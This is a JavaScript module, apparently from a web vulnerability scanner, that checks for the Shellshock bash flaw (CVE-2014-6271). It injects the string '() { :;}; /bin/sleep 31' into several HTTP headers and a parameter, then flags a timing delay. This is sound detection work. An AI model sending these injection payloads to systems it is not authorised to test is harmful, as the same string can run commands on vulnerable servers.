var module = {
  name: "Bash Environment Variable Blind OS Injection (CVE-2014-6271) Checks",
  category: "Injection Modules",
  differential: true
};

var alteredRequests = [];

var sleepPayload = "() { :;}; /bin/sleep 31" 

alteredRequests.push({
	payload: sleepPayload,
	header: "Custom"
});

alteredRequests.push({
	payload: sleepPayload,
	header: "User-Agent"
});

alteredRequests.push({
	payload: sleepPayload,
	header: "Referer"
});

alteredRequests.push({
	payload: sleepPayload,
	header: "Accept-Language"
});

alteredRequests.push({
	payload: sleepPayload,
	header: "Cookie"
});

alteredRequests.push({
  payload: sleepPayload,
  header: ""
});

function initialize(ctx) {
  var ps = ctx.getPathState();
    var req = ps.createAlteredRequest("", true);
    req.addHeader("Custom", "() { :;}; /bin/sleep 31");
    /*var req1 = ps.createAlteredRequest("", true);
    req1.addHeader("User-Agent", "() { :;}; /bin/sleep 31 ");
    var req2 = ps.createAlteredRequest("", true);
    req2.addHeader("Referer", "() { :;}; /bin/sleep 31 ");
    var req3 = ps.createAlteredRequest("", true);
    req3.addHeader("Accept-Language", "() { :;}; /bin/sleep 31 ");
    var req4 = ps.createAlteredRequest("", true);
    req4.addHeader("Cookie", "() { :;}; /bin/sleep 31 "); 
   
    var req5 = ps.createAlteredRequest("() { :;}; /bin/sleep 31", false);
    */ 
    ctx.submitRequest(req, process, 0);
    /*ctx.submitRequest(req1, process, 1);
    ctx.submitRequest(req2, process, 2);
    ctx.submitRequest(req3, process, 3);
    ctx.submitRequest(req4, process, 4);
    ctx.submitRequest(req5, process, 5);*/
}

var checkTiming = function(ctx, currentIndex) {
  if (ctx.getSavedResponse(currentIndex).milliseconds > 30000) {
    return true;
  }
  return false;
};

function process(req, res, ctx) {
  if (ctx.hasModuleFailed()) return;
  if (res.fetchFail) {
    ctx.error(req, res, "During Bash Environment Variable injection checks");
    ctx.setModuleFailed();
    return;
  }
  var ps = ctx.getPathState();
  var currentIndex = ctx.getCurrentIndex();
  ctx.addRequestResponse(req, res);
  ctx.incrementResponseCount();
  var detected = checkTiming(ctx, currentIndex);
  if (detected) {
    var uri = String(req.requestLine.uri);                                      
    var uripart = uri.replace(/\?.*/, "");                                      
    if ((uripart.length > 2) && (uripart.slice(-1) == "/")) {
      uripart = uripart.substring(0, uripart.length-1);
    }

    ctx.alert("vinfo-bash-inject", ctx.getSavedRequest(currentIndex), ctx.getSavedResponse(currentIndex), {
      output: res.bodyAsString,                                                 
      key: "vinfo-shell-inject:" + uripart + ":" + ps.getFuzzableParameter().name,
      resource: uripart,                                                        
      detectiontype: 'Blind Timing Analysis Checks',
      param: ps.getFuzzableParameter().name                                     
    });              
  } else {
  	if (currentIndex + 1 < alteredRequests.length) {
      if (alteredRequests[currentIndex + 1].header == "") {
        req = ps.createAlteredRequest(alteredRequests[currentIndex + 1].payload, false);
      } else {
        req = ps.createAlteredRequest("", true);
        req.addHeader(alteredRequests[currentIndex + 1].header, alteredRequests[currentIndex + 1].payload);
      }
			ctx.submitAlteredRequest(process, req, currentIndex + 1);
		}
  }
  
  if (ctx.allResponsesReceived()) {
		ps.decrementFuzzCounter();
	}
}
